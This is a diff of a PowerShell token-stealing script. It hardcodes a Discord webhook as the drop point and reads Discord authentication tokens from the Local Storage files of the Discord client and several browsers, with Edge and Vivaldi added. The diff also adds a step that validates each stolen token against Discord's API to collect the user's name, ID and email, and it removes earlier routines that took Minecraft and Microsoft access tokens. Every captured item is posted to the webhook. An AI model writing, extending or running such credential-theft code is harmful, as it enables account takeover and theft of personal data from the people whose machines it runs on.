@@ -1,45 +1,14 @@
 $webhookUrl = "https://discord.com/api/webhooks/1508519789566496950/B3L__pijUlyH20EfneD3XeA2CwwzCw0HteEze4taaUyxD1txNgPF2BwVXgeJzG-3Ifme"
 
-# Method 1: Grab Minecraft launcher tokens from Java processes
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
-    Select-Object -ExpandProperty CommandLine |
-    ForEach-Object {
-        $accessToken = $null
-        $username = $null
-        $uuid = $null
-
-        if ($_ -match '--accessToken\s+(\S+)') {
-            $accessToken = $matches[1]
-        }
-        if ($_ -match '--username\s+(\S+)') {
-            $username = $matches[1]
-        }
-        if ($_ -match '--uuid\s+(\S+)') {
-            $uuid = $matches[1]
-        }
-
-        if ($accessToken -and $username) {
-            $message = @"
-**Minecraft Account Compromised**
-**Username:** $username
-**AccessToken:** $accessToken
-**UUID:** $uuid
-**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-**IP:** $(Invoke-RestMethod -Uri 'https://api.ipify.org')
-"@
-            $payload = @{content = $message} | ConvertTo-Json -Depth 10
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
-        }
-    }
-
-# Method 2: Grab Discord tokens from Local Storage
 $discordPaths = @(
     "$env:APPDATA\discord\Local Storage\leveldb",
     "$env:APPDATA\discordcanary\Local Storage\leveldb",
     "$env:APPDATA\discordptb\Local Storage\leveldb",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
     "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb"
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"
 )
 
 foreach ($path in $discordPaths) {
@@ -48,9 +17,27 @@ foreach ($path in $discordPaths) {
             $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
             if ($content -match '[\"\\\']token[\"\\\']:[\"\\\']([a-zA-Z0-9_\-]{24,}\.[a-zA-Z0-9_\-]{6,}\.[a-zA-Z0-9_\-]{27,})[\"\\\']') {
                 $token = $matches[1]
+                
+                # Optional: Validate token and fetch user info
+                try {
+                    $userInfo = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers @{Authorization = $token} -ErrorAction SilentlyContinue
+                    $username = $userInfo.username
+                    $discriminator = $userInfo.discriminator
+                    $userId = $userInfo.id
+                    $email = $userInfo.email
+                } catch {
+                    $username = "Unknown"
+                    $discriminator = "0000"
+                    $userId = "Unknown"
+                    $email = "Unknown"
+                }
+                
                 $message = @"
 **Discord Token Captured**
 **Token:** $token
+**Username:** $username#$discriminator
+**User ID:** $userId
+**Email:** $email
 **Source:** $($_.FullName)
 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 "@
@@ -58,22 +45,5 @@ foreach ($path in $discordPaths) {
                 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
             }
         }
-    }
-}
-
-# Method 3: Grab Microsoft access tokens from Minecraft launcher logs
-$logPath = "$env:APPDATA\.minecraft\launcher_log.txt"
-if (Test-Path $logPath) {
-    $logContent = Get-Content $logPath -Raw -ErrorAction SilentlyContinue
-    if ($logContent -match 'accessToken":\s*"([a-f0-9\-]{36})"') {
-        $microsoftToken = $matches[1]
-        $message = @"
-**Microsoft Minecraft Token Captured**
-**Token:** $microsoftToken
-**Source:** launcher_log.txt
-**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"@
-        $payload = @{content = $message} | ConvertTo-Json -Depth 10
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
     }
 }
